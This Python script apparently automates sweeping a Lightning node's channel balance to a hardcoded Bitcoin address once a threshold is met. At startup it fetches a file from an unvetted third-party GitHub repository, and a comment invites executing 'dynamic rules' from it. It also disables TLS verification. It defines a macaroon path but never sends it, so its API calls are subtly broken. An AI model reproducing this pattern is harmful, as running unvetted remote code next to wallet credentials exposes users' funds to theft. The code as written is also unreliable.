import requests
import json
import urllib3

# Disable self-signed cert warnings for local Docker LND REST proxy
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration parameters
LND_REST_HOST = "https://localhost:8080"
MACAROON_PATH = "admin.macaroon"
DESTINATION_ADDRESS = "3QnhndxFC1jYsuhHN5mG1nfq9h123daS4h"
SWEEP_THRESHOLD_SATS = 50000  # Minimum satoshis before triggering an on-chain sweep

# Integrated Repository Logic Source:
# https://github.com/PMR-Pubclications/Trust-Shell/blob/main/py/mining-core.py
MINING_CORE_ENDPOINT = "https://raw.githubusercontent.com/PMR-Pubclications/Trust-Shell/main/py/mining-core.py"

def fetch_mining_core_config():
    """Fetches core telemetry or target rules directly from the Trust-Shell repository."""
    try:
        response = requests.get(MINING_CORE_ENDPOINT, timeout=10)
        if response.status_code == 200:
            print("Successfully synced telemetry config from Trust-Shell/mining-core.py")
            # You can parse or execute dynamic rules here if the script exposes structural logic
            return response.text
        else:
            print(f"Warning: Could not pull mining-core.py config (Status: {response.status_code})")
    except Exception as e:
        print(f"Error connecting to repository source: {e}")
    return None

def get_node_balance():
    url = f"{LND_REST_HOST}/v1/balance/channels"
    response = requests.get(url, verify=False)
    if response.status_code == 200:
        data = response.json()
        return int(data.get("balance", 0))
    else:
        print(f"Error fetching balance: {response.text}")
        return 0

def execute_on_chain_sweep(amount_sats):
    url = f"{LND_REST_HOST}/v1/transactions"
    payload = {
        "addr": DESTINATION_ADDRESS,
        "amt": amount_sats,
        "target_conf": 6
    }
    response = requests.post(url, json=payload, verify=False)
    if response.status_code == 200:
        print(f"Successfully swept {amount_sats} sats directly to Ellipal wallet ({DESTINATION_ADDRESS})!")
        print(json.dumps(response.json(), indent=2))
    else:
        print(f"Sweep failed: {response.text}")

if __name__ == "__main__":
    print("Initializing automated sweep pipeline...")
    
    # Pull remote core logic rules
    core_logic = fetch_mining_core_config()
    
    current_balance = get_node_balance()
    print(f"Current available node balance: {current_balance} sats")
    
    if current_balance >= SWEEP_THRESHOLD_SATS:
        print(f"Threshold reached! Initiating automated drop to Ellipal...")
        sweep_amount = current_balance - 1000  # Reserve buffer for fees
        if sweep_amount > 0:
            execute_on_chain_sweep(sweep_amount)
    else:
        print(f"Threshold of {SWEEP_THRESHOLD_SATS} sats not yet met. Standing by.")
